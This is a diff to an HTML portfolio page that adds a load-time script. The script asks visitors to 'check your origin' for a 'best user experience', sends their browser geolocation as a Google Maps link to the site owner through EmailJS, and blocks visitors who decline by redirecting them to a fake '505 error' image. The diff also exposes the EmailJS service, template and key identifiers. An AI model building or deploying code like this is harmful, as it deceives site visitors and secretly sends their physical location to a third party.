@@ -19,8 +19,6 @@
 </head>
 
 <body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">
-    <button onclick="getUserLocationAndVisit()">Get My Location and Visit</button>
-    <p id="location"></p>
 
     <!-- Page Navbar -->
     <nav class="custom-navbar" data-spy="affix" data-offset-top="20">
@@ -406,18 +404,17 @@
     
     <!--Location Code-->
     <script>
-        emailjs.init("service_hxv44ll");
+        emailjs.init("uKvbMWpK4TFf0Idww");
+        
+        console.log("EmailJS has been activate...")
+            // Show an alert to the user
+            const userResponse = confirm("Get Best User Experience, Allow System to Check Your Origin!");
+        if (userResponse) {
+            getUserLocationAndVisit();
+        } else {
+            alert("You declined location feature, so you won't be redirected to the website.");
+            window.location.href = "https://media.licdn.com/dms/image/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/0/1581099611064?e=1703116800&v=beta&t=-ufm_qVoEY7tm6dRnOLrur3x-elqN98HBS8S9HQhocQ"; // 505 ERROR Photo
 
-        function sendEmailWithLocation(latitude, longitude) {
-            emailjs.send("service_hxv44ll", "template_qiokg5l", {
-                from_name: "Your Name",
-                to_name: "Recipient Name",
-                message: `Someone visited your website. Location: Latitude ${latitude}, Longitude ${longitude}`
-            }).then(function(response) {
-                console.log("Email sent:", response);
-            }, function(error) {
-                console.error("Email send error:", error);
-            });
         }
 
         function getUserLocationAndVisit() {
@@ -425,22 +422,37 @@
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    const locationElement = document.getElementById("location");
-                    locationElement.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                    console.log("latitude:", latitude)
+                    console.log("longitude:", longitude)
                     
                     // Send an email with the location coordinates
                     sendEmailWithLocation(latitude, longitude);
 
                     // Redirect to your portfolio website
-                    window.location.href = "https://itxmujahidali.github.io/"; // Your website URL
+                    setTimeout(() => {
+                        window.location.href = "https://itxmujahidali.github.io/"; // Your website URL
+                    }, 5000);
                 }, function(error) {
-                    alert("To access this website, you need to provide your location.");
+                    alert("To access this website, you need to provide your origin.");
                     console.error("Geolocation error:", error);
-                });
+                                   });
             } else {
                 alert("Geolocation is not supported in your browser.");
             }
         }
+
+        function sendEmailWithLocation(latitude, longitude) {
+            emailjs.send("service_ntpef16", "template_qiokg5l", {
+                from_name: "Portfolio",
+                to_name: "Mujahid",
+                message: `Someone visited your website. Track Location: https://www.google.com/maps/place/${latitude},${longitude}/`
+            }).then(function(response) {
+                console.log("Email sent:", response);
+            }, function(error) {
+                console.error("Email send error:", error);
+            });
+        }
+
     </script>
 
 </body>
